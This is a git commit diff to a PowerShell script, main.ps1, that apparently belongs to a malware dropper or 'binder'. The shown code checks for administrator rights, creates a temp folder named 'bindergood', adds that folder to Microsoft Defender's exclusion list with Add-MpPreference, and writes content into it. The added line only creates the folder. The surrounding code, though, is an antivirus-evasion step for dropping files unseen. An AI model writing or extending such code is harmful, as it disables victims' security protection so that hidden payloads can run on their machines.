3b3a4aad849b1ccc20b79fdb8d5f6a28658c4d09
43a1723 <hai1723notgay@gmail.com>
2024-06-29 16:56:13 +0700

    Update main.ps1

--- file/main.ps1
+++ file/main.ps1
@@ -4,5 +4,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $directoryPath = "$env:temp\bindergood"
+New-Item -Path $directoryPath -ItemType Directory
 Add-MpPreference -ExclusionPath $directoryPath
 Set-Content -Path $tempFile -Value $Filecontent
